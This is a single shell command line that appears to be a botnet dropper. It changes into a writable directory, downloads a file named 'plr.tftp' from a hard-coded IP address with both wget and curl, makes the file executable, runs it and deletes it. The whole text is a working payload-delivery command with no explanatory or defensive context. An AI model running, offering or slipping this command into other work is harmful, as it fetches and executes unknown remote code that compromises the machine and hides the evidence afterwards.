cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.176.235.250/plr.tftp; curl -O http://94.176.235.250/plr.tftp; chmod +x plr.tftp; ./plr.tftp; rm -rf plr.tftp
